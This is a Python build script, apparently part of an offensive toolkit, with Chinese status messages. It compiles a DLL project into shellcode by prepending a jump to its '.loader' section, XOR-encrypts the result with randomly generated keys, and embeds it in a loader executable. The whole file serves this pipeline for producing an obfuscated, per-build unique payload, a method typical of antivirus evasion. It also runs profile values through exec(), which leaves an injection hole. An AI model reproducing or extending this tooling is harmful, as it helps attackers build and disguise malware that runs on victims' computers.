import os
import re
import sys
import json
import time
import shutil
import random
import subprocess

RED = '\033[91m'
BLUE = '\033[94m'
GREEN = '\033[92m'
RESET = '\033[0m'

global shellcode
randList = dict()

def ProcessSetRand(setRandInfo):
    print(f'{BLUE}处理 SetRand...{RESET}')
    random.seed(time.time())
    for name, max in setRandInfo.items():
        print(name + ' : ' + max)
        exec(f'randList["{name}"] = str(random.randint(0, {max}))')
    print(randList)

def ProcessReplace(shellPath, project, replaceInfo):
    print(f'{BLUE}处理 Replace...{RESET}')
    print('Project : ' + project)
    for fileName, replaceDict in replaceInfo.items():
        print(fileName)
        shutil.copy(f'{shellPath}\\{project}\\{fileName}', f'{shellPath}\\{project}\\{fileName}Original')
        with open(f'{shellPath}\\{project}\\{fileName}', 'r', encoding='UTF-8') as file:
            code = file.read()
        for old, new in replaceDict.items():
            name = re.findall(r'(<(.+)>)', new)
            if len(name) == 1:
                new = new.replace(name[0][0], randList[name[0][1]])
            print(old + ' : ' + new)
            code = code.replace(old, new)
        with open(f'{shellPath}\\{project}\\{fileName}', 'w', encoding='UTF-8') as file:
            file.write(code)

def AddLoaderJmp(shellcodePath):
    with open(shellcodePath, 'rb') as file:
        dll = file.read()
    for i in range(len(dll)):
        if dll[i:i+7].decode(errors='replace') == '.loader':
            jmp = b'\xE9' + dll[i+4*5:i+4*6]
            break
    return jmp + dll

def ProcessGenerateShellCode(shellPath, generateShellCodeInfo):
    print(f'{BLUE}处理 GenerateShellCode...{RESET}')
    for project, projectInfo in generateShellCodeInfo.items():
        print(f'{GREEN}编译中，请稍等...{RESET}')
        print(f'{GREEN}msbuild "{shellPath}\\{project}\\{project}.sln" /p:Configuration=Release /p:Platform=x64 /t:Clean{RESET}')
        subprocess.run(f'msbuild "{shellPath}\\{project}\\{project}.sln" /p:Configuration=Release /p:Platform=x64 /t:Clean', stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        print(f'{GREEN}msbuild "{shellPath}\\{project}\\{project}.sln" /p:Configuration=Release /p:Platform=x64 /t:Build{RESET}')
        subprocess.run(f'msbuild "{shellPath}\\{project}\\{project}.sln" /p:Configuration=Release /p:Platform=x64 /t:Build', stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)

        global shellcode
        print(f'{BLUE}将 {projectInfo["Product"]} 转为 ShellCode...{RESET}')
        shellcodePath = f'{shellPath}\\{project}\\x64\\Release\\{projectInfo["Product"]}'
        shellcode = AddLoaderJmp(shellcodePath)
        os.remove(shellcodePath)
        print(f'{BLUE}加密 ShellCode...{RESET}')
        shellcode = bytes([byte ^ int(randList['xor1']) ^ int(randList['xor2']) for byte in shellcode])

        for fileName in projectInfo['Restore']:
            print(f'{BLUE}还原 {fileName} 源码...{RESET}')
            shutil.move(f'{shellPath}\\{project}\\{fileName}Original', f'{shellPath}\\{project}\\{fileName}')

def ProcessGenerateLoader(shellPath, endProductPath, generateLoaderInfo):
    print(f'{BLUE}处理 GenerateLoader...{RESET}')
    print(f'{BLUE}写入 ShellCode...{RESET}')
    for project, projectInfo in generateLoaderInfo.items():
        with open(f'{shellPath}\\{project}\\{projectInfo["ShellCodePath"]}', 'wb') as file:
            file.write(shellcode)
        print(f'{GREEN}编译中，请稍等...{RESET}')
        print(f'{GREEN}msbuild "{shellPath}\\{project}\\{project}.sln" /p:Configuration=Release /p:Platform=x64 /t:Clean{RESET}')
        subprocess.run(f'msbuild "{shellPath}\\{project}\\{project}.sln" /p:Configuration=Release /p:Platform=x64 /t:Clean', stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        print(f'{GREEN}msbuild "{shellPath}\\{project}\\{project}.sln" /p:Configuration=Release /p:Platform=x64 /t:Build{RESET}')
        subprocess.run(f'msbuild "{shellPath}\\{project}\\{project}.sln" /p:Configuration=Release /p:Platform=x64 /t:Build', stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        try:
            os.remove(endProductPath)
        except:
            pass

        for fileName in projectInfo['Restore']:
            print(f'{BLUE}还原 {fileName} 源码...{RESET}')
            shutil.move(f'{shellPath}\\{project}\\{fileName}Original', f'{shellPath}\\{project}\\{fileName}')

        shutil.move(f'{shellPath}\\{project}\\x64\\Release\\{projectInfo["Product"]}', endProductPath)
    print(f'{RED}ShellCode 生成路径(异或加密): {shellPath}\\{project}\\{projectInfo["ShellCodePath"]}\nEXE 生成路径(勿动，还有后续生成步骤): {endProductPath}\nPlease close the terminal to the next stage.{RESET}')

if __name__ == '__main__':
    try:
        print(f'{BLUE}解析 Profile...{RESET}')
        profilePath = sys.argv[1]
        shellPath = os.path.abspath(profilePath + '\\..\\..\\..')
        endProductPath = os.path.abspath(profilePath + '\\..\\tmp\\Product.exe')
        with open(profilePath, 'r', encoding='UTF-8') as file:
            profile = json.loads(file.read())
        for action in profile:
            if action['Action'] == 'SetRand':
                ProcessSetRand(action['SetRand'])
            elif action['Action'] == 'Replace':
                ProcessReplace(shellPath, action['Project'], action['Replace'])
            elif action['Action'] == 'GenerateShellCode':
                ProcessGenerateShellCode(shellPath, action['GenerateShellCode'])
            elif action['Action'] == 'GenerateLoader':
                ProcessGenerateLoader(shellPath, endProductPath, action['GenerateLoader'])
    except Exception as e:
        print(f'{RED}{e}{RESET}')
    input()